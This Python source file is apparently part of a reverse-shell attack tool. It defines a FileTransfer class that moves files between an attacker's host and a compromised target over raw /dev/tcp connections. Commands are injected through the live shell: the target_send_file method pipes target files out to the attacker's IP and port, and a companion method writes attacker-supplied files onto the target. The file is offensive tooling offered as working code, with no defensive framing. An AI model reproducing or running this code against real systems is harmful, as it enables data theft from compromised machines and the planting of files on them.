from file_transfer_listener import PortFileTransfer


class FileTransfer:
    def __init__(self, host_ip, host_port, current_reverse_shell):
        self.host_ip = host_ip
        self.host_port = host_port
        self.file_port = None
        self.reverse_shell = current_reverse_shell

    def initiate_target_receive_file(self):
        # wait to give the host time to listen - this sucks, too bad...
        command = "sleep 1;exec 6< /dev/tcp/{ip}/{port}\n".format(ip=self.host_ip, port=self.host_port)
        self.reverse_shell.listener.send_data(command)

    def write_target_receive_file(self, file_path):
        command = "cat <&6 > {file_path}\n".format(file_path=file_path)
        self.reverse_shell.listener.send_data(command)
        #return_value = self.reverse_shell.listener.send_receive(command)
        #print(return_value)

    def target_send_file(self, file_path):
        command = "sleep 1;cat {file_path} > /dev/tcp/{ip}/{port}\n".format(file_path=file_path, ip=self.host_ip,
                                                                              port=self.host_port)
        self.reverse_shell.listener.send_data(command)
        #return_value = self.reverse_shell.listener.send_receive(command)
        #print(return_value)

    def initiate_file_port(self):
        if not self.file_port:
            self.file_port = PortFileTransfer(self.host_ip, self.host_port, self.reverse_shell.target_ip)
            self.file_port.get_connected()

    def host_receive_file(self, file_path):
        data = self.file_port.receive_data()
        with open(file_path, "wb") as file:
            file.write(data)

    def host_send_file(self, file_path):
        with open(file_path, "rb") as file:
            self.file_port.send_data(file.read())

    def host_to_target(self, source_file_path, destination_file_path):
        self.initiate_target_receive_file()
        self.initiate_file_port()
        self.host_send_file(source_file_path)
        self.write_target_receive_file(destination_file_path)
        self.reverse_shell.cli.cli_print("File sent!")

    def target_to_host(self, source_file_path, destination_file_path):
        self.target_send_file(source_file_path)
        self.initiate_file_port()
        self.host_receive_file(destination_file_path)
        self.reverse_shell.cli.cli_print("File received!")

    def close(self):
        self.file_port.close()
